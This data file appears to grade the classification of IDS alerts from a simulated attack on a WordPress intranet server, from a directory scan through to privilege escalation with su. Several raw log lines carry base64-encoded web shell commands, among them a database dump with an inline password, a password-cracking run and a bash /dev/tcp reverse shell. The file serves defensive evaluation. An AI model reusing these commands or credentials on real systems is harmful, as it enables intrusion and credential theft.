AT;#;Classification;Attack Line Content;Description;Correct Attack Type?
Dirb;1;"Directory Traversal Attempt,
Reconnaissance";"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
Raw Data: “GET /wp-content/themes/go/includes/classes/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters used and http status code 404;Correct & expressive
Dirb;2;"File Enumeration,
Reconnaissance";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/info.php' not found or unable to stat”";Classification probably based on attempted access to sensitive file in WordPress folder;Correct & expressive
Dirb;1;"Access Control Bypass,
Reconnaissance";"IDS: “New status code in Apache Access log.”, “New value(s) detected”, 
Raw Data: “GET /wp-includes/js/tinymce/plugins/hr/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on attempted access to WordPress plugin folder and http status code 403;Alternate explanation for alert
Dirb;5;"Directory Traversal, 
Reconnaissance";"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/images/admin/~logs HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters used and http status code 404;Correct & expressive
Dirb;1;"File Enumeration, 
Reconnaissance";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/info.php' not found or unable to stat”";Classification probably based on attempted access to sensitive file in WordPress folder (php);Correct & expressive
Dirb;1;"Reconnaissance,
Path Traversal Attempt";"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/images/admin/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters used and http status code 404;Correct & expressive
Dirb;1;"Reconnaissance,
File Discovery";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/phpinfo.php' not found or unable to stat”";Classification probably based on attempted access to sensitive file in WordPress folder (php);Correct & expressive
Dirb;1;"Access Denied,
Reconnaissance";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/images/social/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on attempted access to WordPress themes folder and http status code 403;Too generic
Dirb;1;"Access Denied,
Malicious File Probe";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/images/social/.hta HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on attempted access to WordPress themes folder and http status code 403;Correct & expressive
Dirb;2;"Access Denied, 
Credential Access Attempt";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/js/admin/.htpasswd HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on attempted access to sensitive file in WordPress themes folder;Alternate explanation for alert
Dirb;3;"Reconnaissance,
Suspicious Character Usage";"IDS: “New characters in Apache Access request.”, “New character(s) detected,
Raw Data: “GET /wp-content/themes/go/dist/js/admin/@ HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters used and http status code 404;Too generic
Dirb;1;"Access Denied,
Server Misconfiguration Probe";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htaccess”";Classification probably based on attempted access to sensitive file in WordPress folder;Alternate explanation for alert
Dirb;3;Unauthorized Access Attempt;"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htaccess_”";Classification probably based on attempted access to sensitive file in WordPress themes folder;Alternate explanation for alert
Dirb;2;"File Enumeration,
Reconnaissance";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/admin.php' not found or unable to stat”";Classification probably based on attempted access to sensitive file in WordPress folder (php);Correct & expressive
Web Shell;2;"Web Shell Access,
Command and Control";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 200 507795 - python-requests/2.27.1”";Classification probably based on high entropy in base64 encoded payload in wp upload path;Correct & expressive
Password Cracking;1;"Web Shell Access,
Command and Control";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 200 506876 - python-requests/2.27.1”";"Classification probably based on high entropy in base64 encoded payload in wp upload path; base64 has not been decoded for classification";Alternate explanation for alert
Password Cracking;1;Anomalous HTTP Method Usage;"IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”,
Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36”";Classification probably based on unusual occurrence of apache requests;Too generic
Password Cracking;1;"Resource Exhaustion,
System Anomaly";IDS: “CPU value deviates from average in monitoring logs.”, “Statistical data report”;Classification probably based on unusual CPU value;Alternate explanation for alert
Password Cracking;1;"Reconnaissance,
DNS Tunneling";"IDS: “Unusual occurrence frequencies of DNS query Ips.”, “Frequency anomaly detected”
Raw Data: “dnsmasq[14460]: query[A] mmx-ds.cdn.whatsapp.net from [IP]”";Classification probably based on unusual occurrence of DNS queries;Alternate explanation for alert
Password Cracking;1;"Web Application Attack,
Reconnaissance";"IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”,
Raw Data: “GET / HTTP/1.1 200 6128 - Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0”";Classification probably based on unusual occurrence of apache requests;Too generic
Reverse Shell;1;"Web Shell, 
Remote Code Execution";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1 200 506717 - python-requests/2.27.1”";Classification probably based on base64 encoding in payload;Correct & expressive
Privilege Escalation;2;"Privilege Escalation,
Credential Access";"IDS: “New event type.”, “New path(es) detected”
Raw Data: “intranet-server su[28816]: Successful su for phopkins by www-data”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation;1;"Privilege Escalation, 
Credential Access";"IDS: “New event type.”, “New path(es) detected”
Raw Data: “intranet-server su[28816]: pam_unix(su:session): session opened for user phopkins by (uid=33)”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation;1;"Credential Access, 
Privilege Escalation";"IDS: “New user_auth parameter combination in Audit logs.”, “New value combination(s) detected”
Raw Data: “type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation;1;"Credential Access,
Privilege Escalation";"IDS: “New user_acct parameter combination in Audit logs.”, “New value combination(s) detected”
Raw Data: “type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation;1;Credential Access;"IDS: “New cred_acq parameter combination in Audit logs.”, “New value combination(s) detected”
Raw Data: “type=CRED_ACQ msg=audit(1642511671.663:2443): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on tool name su;Alternate explanation for alert
Privilege Escalation;1;"Privilege Escalation,
Persistence";"IDS: “New user_start parameter combination in Audit logs.”, “New value combination(s) detected”
Raw Data: “type=USER_START msg=audit(1642511672.403:2449): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on tool name su;Correct & expressive
;95;;;;
